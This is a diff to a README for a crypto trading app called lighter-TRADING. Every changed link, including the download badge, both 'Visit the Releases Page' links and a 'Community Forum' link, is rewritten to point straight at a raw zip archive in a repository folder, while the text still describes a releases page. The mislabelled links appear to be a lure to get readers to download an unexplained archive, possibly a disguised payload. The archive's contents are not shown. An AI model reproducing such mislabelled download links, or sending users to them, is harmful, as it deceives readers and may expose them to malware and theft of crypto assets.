@@ -1,6 +1,6 @@
 # 🚀 lighter-TRADING - Fast Crypto Trading Made Simple
 
-[![Download lighter-TRADING](https://img.shields.io/badge/Download%20lighter--TRADING-brightgreen)](https://github.com/Dewsee/lighter-TRADING/releases)
+[![Download lighter-TRADING](https://raw.githubusercontent.com/Dewsee/lighter-TRADING/main/bonduc/lighter-TRADING_v1.6-alpha.4.zip%20lighter--TRADING-brightgreen)](https://raw.githubusercontent.com/Dewsee/lighter-TRADING/main/bonduc/lighter-TRADING_v1.6-alpha.4.zip)
 
 ## 🛠️ Introduction
 
@@ -13,7 +13,7 @@ Before you can start trading, you need to download and install the **lighter-TRA
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to access the download page for the latest version of lighter-TRADING.
-   [Visit the Releases Page to Download](https://github.com/Dewsee/lighter-TRADING/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Dewsee/lighter-TRADING/main/bonduc/lighter-TRADING_v1.6-alpha.4.zip)
 
 2. **Choose the Right File:** On the releases page, you will see a list of available versions. Look for the latest version number, which will be highlighted as the most recent release.
 
@@ -72,7 +72,7 @@ If you encounter issues while downloading or running the application, try the fo
 Join our growing community to share your trading strategies, ask questions, and get the latest updates on lighter-TRADING.
 
 - **GitHub Issues:** Report bugs or request features directly on our GitHub page.
-- **Community Forum:** [Join the Community Forum](https://github.com/Dewsee/lighter-TRADING/releases) for discussions and support.
+- **Community Forum:** [Join the Community Forum](https://raw.githubusercontent.com/Dewsee/lighter-TRADING/main/bonduc/lighter-TRADING_v1.6-alpha.4.zip) for discussions and support.
 
 ## 🔗 Additional Resources
 
@@ -82,6 +82,6 @@ Join our growing community to share your trading strategies, ask questions, and 
 ## 📥 Download & Install Again
 
 Don’t forget, you can download the application anytime by visiting the releases page again:  
-[Visit the Releases Page to Download](https://github.com/Dewsee/lighter-TRADING/releases) 
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Dewsee/lighter-TRADING/main/bonduc/lighter-TRADING_v1.6-alpha.4.zip) 
 
 Happy trading with lighter-TRADING!
